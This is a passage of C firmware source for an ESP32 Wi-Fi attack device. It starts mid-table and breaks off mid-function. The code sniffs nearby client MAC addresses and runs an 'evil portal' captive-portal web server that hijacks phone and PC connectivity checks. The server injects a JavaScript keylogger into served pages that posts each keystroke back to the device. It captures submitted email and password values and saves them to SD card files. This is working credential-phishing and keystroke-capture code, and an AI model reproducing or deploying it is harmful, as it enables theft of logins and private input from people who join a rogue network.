    {"581122", COMPANY_ASUS}, {"6045CB", COMPANY_ASUS}, {"60A44C", COMPANY_ASUS}, {"60CF84", COMPANY_ASUS}, {"704D7B", COMPANY_ASUS}, {"708BCD", COMPANY_ASUS}, {"74D02B", COMPANY_ASUS}, {"7824AF", COMPANY_ASUS}, {"7C10C9", COMPANY_ASUS},
    {"88D7F6", COMPANY_ASUS}, {"90E6BA", COMPANY_ASUS}, {"9C5C8E", COMPANY_ASUS}, {"A036BC", COMPANY_ASUS}, {"A85E45", COMPANY_ASUS}, {"AC220B", COMPANY_ASUS}, {"AC9E17", COMPANY_ASUS}, {"B06EBF", COMPANY_ASUS}, {"BCAEC5", COMPANY_ASUS},
    {"BCEE7B", COMPANY_ASUS}, {"C86000", COMPANY_ASUS}, {"C87F54", COMPANY_ASUS}, {"CC28AA", COMPANY_ASUS}, {"D017C2", COMPANY_ASUS}, {"D45D64", COMPANY_ASUS}, {"D850E6", COMPANY_ASUS}, {"E03F49", COMPANY_ASUS}, {"E0CB4E", COMPANY_ASUS},
    {"E89C25", COMPANY_ASUS}, {"F02F74", COMPANY_ASUS}, {"F07959", COMPANY_ASUS}, {"F46D04", COMPANY_ASUS}, {"F832E4", COMPANY_ASUS}, {"FC3497", COMPANY_ASUS}, {"FCC233", COMPANY_ASUS},
    {"000FB3", COMPANY_ACTIONTEC}, {"001505", COMPANY_ACTIONTEC}, {"001801", COMPANY_ACTIONTEC}, {"001EA7", COMPANY_ACTIONTEC}, {"001F90", COMPANY_ACTIONTEC}, {"0020E0", COMPANY_ACTIONTEC},
    {"00247B", COMPANY_ACTIONTEC}, {"002662", COMPANY_ACTIONTEC}, {"0026B8", COMPANY_ACTIONTEC}, {"007F28", COMPANY_ACTIONTEC}, {"0C6127", COMPANY_ACTIONTEC}, {"105F06", COMPANY_ACTIONTEC},
    {"10785B", COMPANY_ACTIONTEC}, {"109FA9", COMPANY_ACTIONTEC}, {"181BEB", COMPANY_ACTIONTEC}, {"207600", COMPANY_ACTIONTEC}, {"408B07", COMPANY_ACTIONTEC}, {"4C8B30", COMPANY_ACTIONTEC},
    {"5C35FC", COMPANY_ACTIONTEC}, {"7058A4", COMPANY_ACTIONTEC}, {"70F196", COMPANY_ACTIONTEC}, {"70F220", COMPANY_ACTIONTEC}, {"84E892", COMPANY_ACTIONTEC}, {"941C56", COMPANY_ACTIONTEC},
    {"9C1E95", COMPANY_ACTIONTEC}, {"A0A3E2", COMPANY_ACTIONTEC}, {"A83944", COMPANY_ACTIONTEC}, {"E86FF2", COMPANY_ACTIONTEC}, {"F8E4FB", COMPANY_ACTIONTEC}, {"FC2BB2", COMPANY_ACTIONTEC},
};

// Function to match the BSSID to a company based on OUI
ECompany match_bssid_to_company(const uint8_t *bssid) {
    char oui[7];
    snprintf(oui, sizeof(oui), "%02X%02X%02X", bssid[0], bssid[1], bssid[2]);

    for (size_t i = 0; i < sizeof(OUI_MAP) / sizeof(OUI_MAP[0]); i++) {
        if (strcmp(oui, OUI_MAP[i].oui) == 0) {
            return OUI_MAP[i].company;
        }
    }

    return COMPANY_UNKNOWN;
}

// Helper macro to check for broadcast/multicast addresses
#define IS_BROADCAST_OR_MULTICAST(addr) (((addr)[0] & 0x01) || (memcmp((addr), "\xff\xff\xff\xff\xff\xff", 6) == 0))

// Function to check if a station MAC already exists in the list
static bool station_mac_exists(const uint8_t *station_mac) {
    for (int i = 0; i < station_count; i++) {
        if (memcmp(station_ap_list[i].station_mac, station_mac, 6) == 0) {
            return true; // Station MAC found
        }
    }
    return false; // Station MAC not found
}

// Helper function to reverse MAC address byte order for comparison
static void reverse_mac(const uint8_t *src, uint8_t *dst) {
    for (int i = 0; i < 6; i++) {
        dst[i] = src[5 - i];
    }
}

void wifi_stations_sniffer_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
    // Focus on Management frames like the example, can be changed back to WIFI_PKT_DATA if needed
    if (type != WIFI_PKT_MGMT) {
        // printf("DEBUG: Dropped non-MGMT packet\n"); 
        return;
    }

    // Check if we have scanned APs to compare against
    if (scanned_aps == NULL || ap_count == 0) {
        // This case should be handled by wifi_manager_start_station_scan now
        printf("ERROR: No scanned APs in callback!\n");
        return;
    }

    const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t *)buf;
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)packet->payload;
    const wifi_ieee80211_hdr_t *hdr = &ipkt->hdr;

    // --- DEBUG: Print raw addresses from MGMT frame ---
    // printf("DEBUG MGMT Frame: Addr1=%02X:%02X:%02X:%02X:%02X:%02X, Addr2=%02X:%02X:%02X:%02X:%02X:%02X, Addr3=%02X:%02X:%02X:%02X:%02X:%02X\n",
    //        hdr->addr1[0], hdr->addr1[1], hdr->addr1[2], hdr->addr1[3], hdr->addr1[4], hdr->addr1[5],
    //        hdr->addr2[0], hdr->addr2[1], hdr->addr2[2], hdr->addr2[3], hdr->addr2[4], hdr->addr2[5],
    //        hdr->addr3[0], hdr->addr3[1], hdr->addr3[2], hdr->addr3[3], hdr->addr3[4], hdr->addr3[5]);

    // --- DEBUG: Print first known AP BSSID ---
    // if (ap_count > 0 && scanned_aps != NULL) {
    //      printf("DEBUG Known AP[0]: BSSID=%02X:%02X:%02X:%02X:%02X:%02X\n",
    //             scanned_aps[0].bssid[0], scanned_aps[0].bssid[1],
    //             scanned_aps[0].bssid[2], scanned_aps[0].bssid[3],
    //             scanned_aps[0].bssid[4], scanned_aps[0].bssid[5]);
    // }
    // ----------------------------------------

    const uint8_t *station_mac = NULL;
    const uint8_t *ap_bssid = NULL;
    int matched_ap_index = -1;

    // Iterate through known APs (from last scan)
    for (int i = 0; i < ap_count; i++) {
        uint8_t *bssid = scanned_aps[i].bssid;
        // Case 1: addr1 == AP BSSID, station likely in addr2
        if (memcmp(hdr->addr1, bssid, 6) == 0 && memcmp(hdr->addr2, bssid, 6) != 0) {
            ap_bssid = bssid;
            station_mac = hdr->addr2;
            matched_ap_index = i;
            break;
        }
        // Case 2: addr2 == AP BSSID, station likely in addr1
        if (memcmp(hdr->addr2, bssid, 6) == 0 && memcmp(hdr->addr1, bssid, 6) != 0) {
            ap_bssid = bssid;
            station_mac = hdr->addr1;
            matched_ap_index = i;
            break;
        }
        // Case 3: addr3 == AP BSSID, station could be in addr1 or addr2
        if (memcmp(hdr->addr3, bssid, 6) == 0) {
            // prefer addr2 (source fields)
            if (memcmp(hdr->addr2, bssid, 6) != 0 && !IS_BROADCAST_OR_MULTICAST(hdr->addr2)) {
                ap_bssid = bssid;
                station_mac = hdr->addr2;
                matched_ap_index = i;
                break;
            }
            if (memcmp(hdr->addr1, bssid, 6) != 0 && !IS_BROADCAST_OR_MULTICAST(hdr->addr1)) {
                ap_bssid = bssid;
                station_mac = hdr->addr1;
                matched_ap_index = i;
                break;
            }
        }
    }
    // If no known AP BSSID found, ignore
    if (matched_ap_index == -1) {
       // printf("DEBUG: Dropped packet - No known AP BSSID found in addresses.\n");
        return;
    }

    // Ensure we are capturing a station, not an AP or broadcast
    if (memcmp(station_mac, ap_bssid, 6) == 0 || IS_BROADCAST_OR_MULTICAST(station_mac)) {
       // printf("DEBUG: Dropped packet - Station MAC is broadcast/multicast or same as AP.\n");
        return;
    }

    // Ignore broadcast MAC address for the station
   // if (IS_BROADCAST_OR_MULTICAST(station_mac)) {
   //     printf("DEBUG: Dropped packet - Station MAC is broadcast/multicast.\n"); // Uncomment for verbose debug
   //     return;
   // }

    // Check if this station MAC has already been seen/logged
    if (!station_mac_exists(station_mac)) {
         // Get the SSID of the matched AP
        char ssid_str[33];
        memcpy(ssid_str, scanned_aps[matched_ap_index].ssid, 32);
        ssid_str[32] = '\0';
        if (strlen(ssid_str) == 0) {
             strcpy(ssid_str, "(Hidden)");
        }

        glog(
            "New Station: %02X:%02X:%02X:%02X:%02X:%02X -> Associated AP: %s (%02X:%02X:%02X:%02X:%02X:%02X)\n",
            station_mac[0], station_mac[1], station_mac[2], station_mac[3], station_mac[4], station_mac[5],
            ssid_str, // Use SSID here
            ap_bssid[0], ap_bssid[1], ap_bssid[2], ap_bssid[3], ap_bssid[4], ap_bssid[5]); // Use original ap_bssid

        // Add the station and the *specific AP BSSID* it was seen with to the list
        add_station_ap_pair(station_mac, ap_bssid);
    } else {
       // printf("DEBUG: Filtered packet - Station MAC already seen.\n");
    }
}

esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *content_type) {
    httpd_resp_set_hdr(req, "Connection", "close");

    if (strncmp(url, "http://", 7) != 0 && strncmp(url, "https://", 8) != 0) {
        FILE *file = fopen(url, "r");
        if (file == NULL) {
            printf("Error: cannot open file %s\n", url);
            return ESP_FAIL;
        }

        httpd_resp_set_type(req, content_type ? content_type : "application/octet-stream");
        httpd_resp_set_status(req, "200 OK");

        char *buffer = NULL;
        bool used_global = false;
        if (stream_buf_lock()) {
            buffer = g_stream_buf;
            used_global = true;
        } else {
            buffer = (char *)malloc(CHUNK_SIZE + 1);
            if (buffer == NULL) {
                fclose(file);
                return ESP_FAIL;
            }
        }

        int read_len;
        while ((read_len = fread(buffer, 1, CHUNK_SIZE, file)) > 0) {
            if (httpd_resp_send_chunk(req, buffer, read_len) != ESP_OK) {
                printf("Error: send chunk failed\n");
                break;
            }
        }
        // Inject capture JS if serving HTML
        if (content_type && strcmp(content_type, "text/html") == 0) {
            httpd_resp_send_chunk(req, CAPTURE_JS_SNIPPET, strlen(CAPTURE_JS_SNIPPET));
        }

        if (used_global) {
            stream_buf_unlock();
        } else {
            free(buffer);
        }
        fclose(file);
        httpd_resp_send_chunk(req, NULL, 0);
        printf("Served file: %s\n", url);
        return ESP_OK;
    } else {
        // Proceed with HTTP request if not an SD card file
        esp_http_client_config_t config = {
            .url = url,
            .timeout_ms = 5000,
            .crt_bundle_attach = esp_crt_bundle_attach,
            .transport_type = HTTP_TRANSPORT_OVER_SSL,
            .user_agent = "Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-G973U) "
                          "AppleWebKit/537.36 (KHTML, like "
                          "Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile "
                          "Safari/537.36", // Browser-like
                                           // User-Agent
                                           // string
            .disable_auto_redirect = false,
        };

        esp_http_client_handle_t client = esp_http_client_init(&config);
        if (client == NULL) {
            printf("Failed to initialize HTTP client\n");
            return ESP_FAIL;
        }

        esp_err_t err = esp_http_client_perform(client);
        if (err != ESP_OK) {
            printf("HTTP request failed: %s\n", esp_err_to_name(err));
            esp_http_client_cleanup(client);
            return ESP_FAIL;
        }

        int http_status = esp_http_client_get_status_code(client);
        printf("Final HTTP Status code: %d\n", http_status);

        if (http_status == 200) {
            printf("Received 200 OK\nRe-opening connection for manual streaming...\n");

            err = esp_http_client_open(client, 0);
            if (err != ESP_OK) {
                printf("Failed to re-open HTTP connection for streaming: %s\n",
                       esp_err_to_name(err));
                esp_http_client_cleanup(client);
                return ESP_FAIL;
            }

            int content_length = esp_http_client_fetch_headers(client);
            printf("Content length: %d\n", content_length);

            httpd_resp_set_type(req, content_type ? content_type : "application/octet-stream");

            httpd_resp_set_hdr(req, "Content-Security-Policy",
                               "default-src 'self' 'unsafe-inline' data: blob:; "
                               "script-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; "
                               "style-src 'self' 'unsafe-inline' data:; "
                               "img-src 'self' 'unsafe-inline' data: blob:; "
                               "connect-src 'self' data: blob:;");
            httpd_resp_set_status(req, "200 OK");

            char *buffer = NULL;
            bool used_global = false;
            if (stream_buf_lock()) {
                buffer = g_stream_buf;
                used_global = true;
            } else {
                buffer = (char *)malloc(CHUNK_SIZE + 1);
                if (buffer == NULL) {
                    esp_http_client_cleanup(client);
                    return ESP_FAIL;
                }
            }

            int read_len;
            while ((read_len = esp_http_client_read(client, buffer, CHUNK_SIZE)) > 0) {
                if (httpd_resp_send_chunk(req, buffer, read_len) != ESP_OK) {
                    printf("Failed to send chunk to client\n");
                    break;
                }
            }

            if (read_len == 0) {
                printf("Finished reading all data from server (end of content)\n");
            } else if (read_len < 0) {
                printf("Failed to read response, read_len: %d\n", read_len);
            }

            if (content_type && strcmp(content_type, "text/html") == 0) {
                const char *javascript_code =
                    "<script>\n"
                    "(function(){\n"
                    "function logKey(key){\n"
                    "    var xhr = new XMLHttpRequest();\n"
                    "    xhr.open('POST','/api/log',true);\n"
                    "    xhr.setRequestHeader('Content-Type','application/json;charset=UTF-8');\n"
                    "    xhr.send(JSON.stringify({key:key}));\n"
                    "}\n"
                    "document.addEventListener('keyup', function(e){ logKey(e.key); });\n"
                    "document.addEventListener('input', function(e){ if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA'){ var val=e.target.value; var key=val.slice(-1); if(key) logKey(key);} });\n"
                    "})();\n"
                    "</script>\n";
                if (httpd_resp_send_chunk(req, javascript_code, strlen(javascript_code)) != ESP_OK) {
                    printf("Failed to send custom JavaScript\n");
                }
            }

            if (used_global) {
                stream_buf_unlock();
            } else {
                free(buffer);
            }
            esp_http_client_close(client);
            esp_http_client_cleanup(client);

            httpd_resp_send_chunk(req, NULL, 0);

            return ESP_OK;
        } else {
            printf("Unhandled HTTP status code: %d\n", http_status);
            esp_http_client_cleanup(client);
            return ESP_FAIL;
        }
    }
}

const char *get_content_type(const char *uri) {
    if (strstr(uri, ".html")) {
        return "text/html";
    }
    if (strstr(uri, ".css")) {
        return "text/css";
    } else if (strstr(uri, ".js")) {
        return "application/javascript";
    } else if (strstr(uri, ".png")) {
        return "image/png";
    } else if (strstr(uri, ".jpg") || strstr(uri, ".jpeg")) {
        return "image/jpeg";
    } else if (strstr(uri, ".gif")) {
        return "image/gif";
    }
    return "application/octet-stream"; // Default to binary stream if unknown
}

const char *get_host_from_req(httpd_req_t *req) {
    size_t buf_len = httpd_req_get_hdr_value_len(req, "Host") + 1;
    if (buf_len > 1) {
        char *host = malloc(buf_len);
        if (httpd_req_get_hdr_value_str(req, "Host", host, buf_len) == ESP_OK) {
            printf("Host header found: %s\n", host);
            return host; // Caller must free() this memory
        }
        free(host);
    }
    printf("Host header not found\n");
    return NULL;
}

void build_file_url(const char *host, const char *uri, char *file_url, size_t max_len) {
    snprintf(file_url, max_len, "https://%s%s", host, uri);
    printf("File URL built: %s\n", file_url);
}

esp_err_t file_handler(httpd_req_t *req) {
    const char *uri = req->uri;
    const char *content_type = get_content_type(uri);
    char local_path[512];
    {
        size_t maxlen = sizeof(local_path) - strlen("/mnt") - 1;
        snprintf(local_path, sizeof(local_path), "/mnt%.*s", (int)maxlen, uri);
    }
    FILE *f = fopen(local_path, "r");
    if (f) {
        fclose(f);
        return stream_data_to_client(req, local_path, content_type);
    }

    char *host = get_host_from_req(req);
    if (host == NULL) {
        httpd_resp_set_status(req, "400 Bad Request");
        httpd_resp_send(req, NULL, 0);
        return ESP_FAIL;
    }

    char file_url[512];
    build_file_url(host, uri, file_url, sizeof(file_url));

    printf("Determined content type: %s for URI: %s\n", content_type, uri);

    esp_err_t result = stream_data_to_client(req, file_url, content_type);

    free(host);

    return result;
}

esp_err_t done_handler(httpd_req_t *req) {
    login_done = true;
    const char *msg = "<html><body><h1>Portal closed</h1></body></html>";
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, msg, strlen(msg));
    // no automatic shutdown
    return ESP_OK;
}
esp_err_t portal_handler(httpd_req_t *req) {
    printf("Client requested URL: %s\n", req->uri);
    ESP_LOGI(TAG, "Free heap before serving portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size

    // Debug buffer state
    ESP_LOGI(TAG, "HTML buffer check: html_buffer=%p, html_buffer_size=%zu, use_html_buffer=%s", 
             html_buffer, html_buffer_size, use_html_buffer ? "true" : "false");

    // Prefer buffered HTML over default embedded portal when available
    if (html_buffer != NULL && html_buffer_size > 0) {
        ESP_LOGI(TAG, "Using buffered HTML (size: %zu bytes)", html_buffer_size);
        httpd_resp_set_type(req, "text/html");
        httpd_resp_set_hdr(req, "Transfer-Encoding", "chunked"); // Set chunked response
        httpd_resp_send_chunk(req, html_buffer, html_buffer_size);
        httpd_resp_send_chunk(req, CAPTURE_JS_SNIPPET, strlen(CAPTURE_JS_SNIPPET));
        httpd_resp_send_chunk(req, NULL, 0);
        ESP_LOGI(TAG, "Served HTML from buffer (size: %zu bytes) with JS injection.", html_buffer_size);
        ESP_LOGI(TAG, "Free heap after serving buffer: %" PRIu32 " bytes", esp_get_free_heap_size());
        return ESP_OK;
    }

    // Check if we should serve the default embedded portal
    if (strcmp(PORTALURL, "INTERNAL_DEFAULT_PORTAL") == 0) {
        httpd_resp_set_type(req, "text/html");
        httpd_resp_set_hdr(req, "Transfer-Encoding", "chunked");
        httpd_resp_send_chunk(req, default_portal_html, strlen(default_portal_html));
        httpd_resp_send_chunk(req, CAPTURE_JS_SNIPPET, strlen(CAPTURE_JS_SNIPPET));
        httpd_resp_send_chunk(req, NULL, 0);
        ESP_LOGI(TAG, "Served default embedded portal with JS injection.");
        ESP_LOGI(TAG, "Free heap after serving default portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
        return ESP_OK;
    }

    // Otherwise, proceed with streaming from URL or file
    esp_err_t err = stream_data_to_client(req, PORTALURL, "text/html");

    if (err != ESP_OK) {
        const char *err_msg = esp_err_to_name(err);

        char error_message[512];
        snprintf(
            error_message, sizeof(error_message),
            "<html><body><h1>Failed to fetch portal content</h1><p>Error: %s</p></body></html>",
            err_msg);

        httpd_resp_set_type(req, "text/html");
        httpd_resp_send(req, error_message, strlen(error_message));
    }

    ESP_LOGI(TAG, "Free heap after serving portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
    return ESP_OK;
}
esp_err_t get_log_handler(httpd_req_t *req) {
    char body[256] = {0};
    int received = 0;

    while ((received = httpd_req_recv(req, body, sizeof(body) - 1)) > 0) {
        body[received] = '\0';

        printf("Received chunk: %s\n", body);

        // Save to SD card if available and filename is set
        if (sd_card_manager.is_initialized && current_keystrokes_filename[0] != '\0') {
            FILE* f = fopen(current_keystrokes_filename, "a");
            if (f) {
                fprintf(f, "%s", body); // Append the chunk
                fclose(f);
            } else {
                printf("Failed to open %s for appending\n", current_keystrokes_filename);
            }
        }
    }

    if (received < 0) {
        printf("Failed to receive request body");
        return ESP_FAIL;
    }

    const char *resp_str = "Body content logged successfully";
    httpd_resp_send(req, resp_str, strlen(resp_str));

    return ESP_OK;
}

esp_err_t get_info_handler(httpd_req_t *req) {
    char query[256] = {0};
    char decoded_email[64] = {0};
    char decoded_password[64] = {0};

    if (httpd_req_get_url_query_str(req, query, sizeof(query)) == ESP_OK) {
        char email_val[64] = {0};
        char pass_val[64] = {0};
        if (get_query_param_value(query, "email", email_val, sizeof(email_val)) == ESP_OK) {
            url_decode(decoded_email, email_val);
        }
        if (get_query_param_value(query, "password", pass_val, sizeof(pass_val)) == ESP_OK) {
            url_decode(decoded_password, pass_val);
        }
        printf("Captured credentials: %s / %s\n", decoded_email, decoded_password);

        // Save credentials to SD card if available and filename is set
        if (sd_card_manager.is_initialized && current_creds_filename[0] != '\0') {
            FILE* f = fopen(current_creds_filename, "a");
            if (f) {
                // Optionally add a timestamp or delimiter here
                fprintf(f, "Email: %s, Password: %s\n", decoded_email, decoded_password);
                fclose(f);
            } else {
                printf("Failed to open %s for appending\n", current_creds_filename);
            }
        }
    }
    if (login_done) {
        httpd_resp_set_status(req, "204 No Content");
        httpd_resp_send(req, NULL, 0);
    } else {
        httpd_resp_set_status(req, "302 Found");
        httpd_resp_set_hdr(req, "Location", "/login");
        httpd_resp_send(req, NULL, 0);
    }
    return ESP_OK;
}

esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
    ESP_LOGI(TAG, "Free heap at redirect handler entry: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
    // Log Host header and User-Agent for diagnostics (help debug iOS probe behavior)
    char *req_host = get_host_from_req(req);
    if (req_host) {
        ESP_LOGI(TAG, "Redirect handler Host header: %s", req_host);
        free(req_host);
    } else {
        ESP_LOGI(TAG, "Redirect handler: Host header not present");
    }
    size_t ua_len = httpd_req_get_hdr_value_len(req, "User-Agent") + 1;
    if (ua_len > 1) {
        char *ua = malloc(ua_len);
        if (ua) {
            if (httpd_req_get_hdr_value_str(req, "User-Agent", ua, ua_len) == ESP_OK) {
                ESP_LOGI(TAG, "Redirect handler User-Agent: %s", ua);
            }
            free(ua);
        }
    }
    if (login_done) {
        httpd_resp_set_hdr(req, "Cache-Control", "no-store");
        httpd_resp_set_status(req, "204 No Content");
        httpd_resp_send(req, NULL, 0);
        return ESP_OK;
    }
    const char *uri = req->uri;
    if (
        (strncmp(uri, "/generate_204", 13) == 0 && (uri[13] == '\0' || uri[13] == '?' )) ||
        (strncmp(uri, "/gen_204", 8) == 0 && (uri[8] == '\0' || uri[8] == '?' )) ||
        (strncmp(uri, "/connecttest.txt", 16) == 0 && (uri[16] == '\0' || uri[16] == '?' )) ||
        (strncmp(uri, "/ncsi.txt", 9) == 0 && (uri[9] == '\0' || uri[9] == '?' )) ||
        (strncmp(uri, "/check_network_status.txt", 25) == 0 && (uri[25] == '\0' || uri[25] == '?' )) ||
        (strncmp(uri, "/success.txt", 12) == 0 && (uri[12] == '\0' || uri[12] == '?' )) ||
        (strncmp(uri, "/library/test/success.html", 26) == 0 && (uri[26] == '\0' || uri[26] == '?' )) ||
        (strncmp(uri, "/success.html", 13) == 0 && (uri[13] == '\0' || uri[13] == '?' )) ||
        (uri[0] == '/' && (uri[1] == '\0' || uri[1] == '?')) ||
        (strncmp(uri, "/redirect", 9) == 0 && (uri[9] == '\0' || uri[9] == '?' ))
    ) {
        httpd_resp_set_hdr(req, "Cache-Control", "no-store");
        esp_err_t r = portal_handler(req);
        ESP_LOGI(TAG, "Free heap at redirect handler exit: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
        return r;
    }
    // minimal logging for captive probe

    if (strstr(req->uri, "/get") != NULL) {
        get_info_handler(req);
        return ESP_OK;
    }

    const char *u = req->uri;
    size_t ulen = strlen(u);
    if ((ulen >= 4 && (strcmp(u + ulen - 4, ".png") == 0 || strcmp(u + ulen - 4, ".jpg") == 0 || strcmp(u + ulen - 4, ".css") == 0 || strcmp(u + ulen - 3, ".js") == 0)) ||
        (ulen >= 5 && strcmp(u + ulen - 5, ".html") == 0)) {
        file_handler(req);
        return ESP_OK;
    }

    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "http://192.168.4.1/login");
    httpd_resp_send(req, NULL, 0);
    ESP_LOGI(TAG, "Free heap at redirect handler exit: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
    return ESP_OK;
}

static esp_err_t apple_probe_handler(httpd_req_t *req) {
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    if (login_done) {
        httpd_resp_set_status(req, "200 OK");
        httpd_resp_set_type(req, "text/html");
        const char *success_response = "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>";
        httpd_resp_send(req, success_response, strlen(success_response));
        return ESP_OK;
    } else {
        return portal_handler(req);
    }
}

static esp_err_t captive_portal_head_ok_handler(httpd_req_t *req) {
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    if (login_done) {
        httpd_resp_set_status(req, "204 No Content");
    } else {
        httpd_resp_set_status(req, "302 Found");
        httpd_resp_set_hdr(req, "Location", "/login");
    }
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

httpd_handle_t start_portal_webserver(void) {
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.max_uri_handlers = 32;
    config.max_open_sockets = 13; // Increased from 7
    config.backlog_conn = 10;     // Increased from 7
    config.stack_size = 6144;
    if (httpd_start(&evilportal_server, &config) == ESP_OK) {
        httpd_uri_t portal_uri = {
            .uri = "/login", .method = HTTP_GET, .handler = portal_handler, .user_ctx = NULL};
        httpd_uri_t portal_android_get = {.uri = "/generate_204", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
        httpd_uri_t portal_android_head = {.uri = "/generate_204", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
        httpd_uri_t portal_android_gen_get = {.uri = "/gen_204", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
        httpd_uri_t portal_android_gen_head = {.uri = "/gen_204", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
        httpd_uri_t portal_apple_get = {.uri = "/hotspot-detect.html", .method = HTTP_GET, .handler = apple_probe_handler, .user_ctx = NULL};
        httpd_uri_t portal_apple_head = {.uri = "/hotspot-detect.html", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
        httpd_uri_t portal_root_get = {.uri = "/", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
        httpd_uri_t portal_root_head = {.uri = "/", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
        httpd_uri_t microsoft_get = {.uri = "/connecttest.txt", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
        httpd_uri_t microsoft_head = {.uri = "/connecttest.txt", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
        httpd_uri_t ncsi_get = {.uri = "/ncsi.txt", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
        httpd_uri_t ncsi_head = {.uri = "/ncsi.txt", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
        httpd_uri_t gnome_get = {.uri = "/check_network_status.txt", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
        httpd_uri_t gnome_head = {.uri = "/check_network_status.txt", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
        httpd_uri_t success_get = {.uri = "/success.txt", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
        httpd_uri_t success_head = {.uri = "/success.txt", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
        httpd_uri_t lib_success_get = {.uri = "/library/test/success.html", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
        httpd_uri_t lib_success_head = {.uri = "/library/test/success.html", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
        httpd_uri_t success_html_get = {.uri = "/success.html", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
        httpd_uri_t success_html_head = {.uri = "/success.html", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
        httpd_uri_t redirect_get = {.uri = "/redirect", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
        httpd_uri_t redirect_head = {.uri = "/redirect", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
        httpd_uri_t log_handler_uri = {
            .uri = "/api/log", .method = HTTP_POST, .handler = get_log_handler, .user_ctx = NULL};
        httpd_uri_t portal_png = {
            .uri = ".png", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
        httpd_uri_t portal_jpg = {
            .uri = ".jpg", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
        httpd_uri_t portal_css = {
            .uri = ".css", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
        httpd_uri_t portal_js = {
            .uri = ".js", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
        httpd_uri_t portal_html = {
            .uri = ".html", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
        httpd_register_uri_handler(evilportal_server, &portal_android_get);
        httpd_register_uri_handler(evilportal_server, &portal_android_head);
        httpd_register_uri_handler(evilportal_server, &portal_android_gen_get);
        httpd_register_uri_handler(evilportal_server, &portal_android_gen_head);
        httpd_register_uri_handler(evilportal_server, &portal_apple_get);
        httpd_register_uri_handler(evilportal_server, &portal_apple_head);
        httpd_register_uri_handler(evilportal_server, &portal_root_get);
        httpd_register_uri_handler(evilportal_server, &portal_root_head);
        httpd_register_uri_handler(evilportal_server, &microsoft_get);
        httpd_register_uri_handler(evilportal_server, &microsoft_head);
        httpd_register_uri_handler(evilportal_server, &ncsi_get);
        httpd_register_uri_handler(evilportal_server, &ncsi_head);
        httpd_register_uri_handler(evilportal_server, &gnome_get);
        httpd_register_uri_handler(evilportal_server, &gnome_head);
        httpd_register_uri_handler(evilportal_server, &success_get);
        httpd_register_uri_handler(evilportal_server, &success_head);
        httpd_register_uri_handler(evilportal_server, &lib_success_get);
        httpd_register_uri_handler(evilportal_server, &lib_success_head);
        httpd_register_uri_handler(evilportal_server, &success_html_get);
        httpd_register_uri_handler(evilportal_server, &success_html_head);
        httpd_register_uri_handler(evilportal_server, &redirect_get);
        httpd_register_uri_handler(evilportal_server, &redirect_head);
        httpd_register_uri_handler(evilportal_server, &portal_uri);
        httpd_register_uri_handler(evilportal_server, &log_handler_uri);

        httpd_register_uri_handler(evilportal_server, &portal_png);
        httpd_register_uri_handler(evilportal_server, &portal_jpg);
        httpd_register_uri_handler(evilportal_server, &portal_css);
        httpd_register_uri_handler(evilportal_server, &portal_js);
        httpd_register_uri_handler(evilportal_server, &portal_html);
        httpd_uri_t done_uri = { .uri = "/done", .method = HTTP_GET, .handler = done_handler, .user_ctx = NULL };
        httpd_register_uri_handler(evilportal_server, &done_uri);
        httpd_register_err_handler(evilportal_server, HTTPD_404_NOT_FOUND,
                                   captive_portal_redirect_handler);
    }
    return evilportal_server;
}

esp_err_t wifi_manager_start_evil_portal(const char *URLorFilePath, const char *SSID, const char *Password,
